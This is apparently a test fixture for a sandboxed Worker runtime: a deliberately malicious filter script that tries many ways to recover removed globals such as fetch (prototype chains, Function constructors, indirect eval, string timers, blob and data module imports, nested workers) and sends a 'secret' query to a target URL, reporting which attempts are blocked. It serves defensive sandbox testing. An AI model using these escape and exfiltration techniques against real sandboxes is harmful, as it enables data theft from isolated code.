// Malicious filter (#27): tries to get back a way out after the runtime removed the network and storage globals
// (spec §15.1: removing them is defense in depth, the sandbox CSP blocks the network anyway). The host message `attack`
// carries a target URL (`{ target }`); the script answers `report` with `{ <attempt>: 'blocked' | 'OPEN: <how>' }`.

/**
 * Globals that open a way out (network, storage, other contexts, peer connections, system notifications). Interfaces
 * that need an instance the script cannot get (`PushManager`, `StorageManager`…) are not listed.
 */
const DANGEROUS = [
  'fetch', 'XMLHttpRequest', 'WebSocket', 'WebSocketStream', 'EventSource', 'WebTransport', 'importScripts', 'Worker',
  'SharedWorker', 'ServiceWorker', 'BroadcastChannel', 'indexedDB', 'caches', 'navigator', 'Request', 'Response',
  'RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCDataChannel', 'Notification', 'PaymentRequest',
]

const WAIT_MS = 3000

async function attempt(fn) {
  try {
    const result = await Promise.race([fn(), new Promise((resolve) => setTimeout(() => resolve(undefined), WAIT_MS))])
    return result === undefined || result === null || result === false ? 'blocked' : `OPEN: ${String(result).slice(0, 200)}`
  } catch {
    return 'blocked'
  }
}

/** Every value named `name` found on the global object and its prototype chain, through any descriptor. */
function fromPrototypes(name) {
  for (let o = globalThis; o; o = Object.getPrototypeOf(o)) {
    const d = Object.getOwnPropertyDescriptor(o, name)
    const v = d && ('value' in d ? d.value : d.get?.call(globalThis))
    if (v) return v
  }
  return undefined
}

/** Uses a recovered `fetch` (or says what was recovered when it is not a function). */
async function use(fetch, url, how) {
  if (!fetch) return undefined
  if (typeof fetch !== 'function') return `${how} gave ${typeof fetch}`
  const response = await fetch(url)
  return `${how}: status ${response.status}`
}

/** Source of a function constructor's body that returns the global `fetch`. */
const BODY = 'return typeof fetch === "undefined" ? undefined : fetch'

export default {
  on: {
    async 'message:attack'(f, { data }) {
      const url = `${data.target}?secret=globals`
      const blobModule = (code) => URL.createObjectURL(new Blob([code], { type: 'text/javascript' }))
      const tries = {
        // Names still visible on the global object (own or inherited), with a value.
        visible: async () => {
          const found = DANGEROUS.filter((name) => {
            try {
              return !!fromPrototypes(name) || !!globalThis[name]
            } catch {
              return false
            }
          })
          return found.length ? found.join(', ') : undefined
        },
        prototypeChain: () => use(fromPrototypes('fetch'), url, 'prototype chain'),
        workerGlobalScope: () => use(globalThis.WorkerGlobalScope?.prototype && Object.getOwnPropertyDescriptor(globalThis.WorkerGlobalScope.prototype, 'fetch')?.value, url, 'WorkerGlobalScope.prototype'),
        constructorOfGlobal: () => use(globalThis.constructor?.prototype?.fetch, url, 'self.constructor.prototype'),
        functionConstructor: () => use(new Function(BODY)(), url, 'new Function'),
        functionFromPrototype: () => use(Function.prototype.constructor(BODY)(), url, 'Function.prototype.constructor'),
        asyncFunctionConstructor: async () => use(await (async () => {}).constructor(BODY)(), url, 'AsyncFunction'),
        generatorConstructor: () => use(function* () {}.constructor(BODY)().next().value, url, 'GeneratorFunction'),
        indirectEval: () => use((0, eval)('typeof fetch === "undefined" ? undefined : fetch'), url, 'indirect eval'),
        stringTimer: () => new Promise((resolve) => {
          globalThis.__evil = undefined
          try {
            setTimeout('globalThis.__evil = typeof fetch === "undefined" ? undefined : fetch', 0)
          } catch {
            resolve(undefined)
          }
          setTimeout(() => resolve(use(globalThis.__evil, url, 'string setTimeout')), 50)
        }),
        // A blob: module runs in this Worker's realm: it sees the same (hardened) global object.
        blobModule: async () => use((await import(blobModule(`export default globalThis.fetch ?? Object.getPrototypeOf(globalThis).fetch`))).default, url, 'blob: module'),
        dataModule: async () => use((await import(`data:text/javascript,export default globalThis.fetch`)).default, url, 'data: module'),
        // A new realm would have fresh globals: a nested worker (from a recovered Worker constructor), a blob: one.
        nestedWorker: () => new Promise((resolve) => {
          const W = fromPrototypes('Worker')
          if (!W) return resolve(undefined)
          const w = new W(blobModule(`fetch(${JSON.stringify(url)}).then((r) => postMessage('status ' + r.status), () => postMessage(null))`))
          w.onmessage = (e) => resolve(e.data && `nested worker: ${e.data}`)
          w.onerror = () => resolve(undefined)
        }),
        // The host page: none of its objects are reachable from the Worker.
        parent: () => globalThis.parent ?? globalThis.top ?? globalThis.opener ?? globalThis.frames ?? undefined,
        document: () => globalThis.document ?? fromPrototypes('document'),
        localStorage: () => globalThis.localStorage ?? globalThis.sessionStorage ?? undefined,
        cookie: () => globalThis.cookieStore ?? undefined,
        // The location of a sandboxed blob: worker has an opaque origin: it names no host.
        origin: () => (globalThis.origin && globalThis.origin !== 'null' ? globalThis.origin : undefined),
      }
      const report = {}
      for (const [name, fn] of Object.entries(tries)) report[name] = await attempt(fn)
      f.emit('report', report)
    },
  },
}
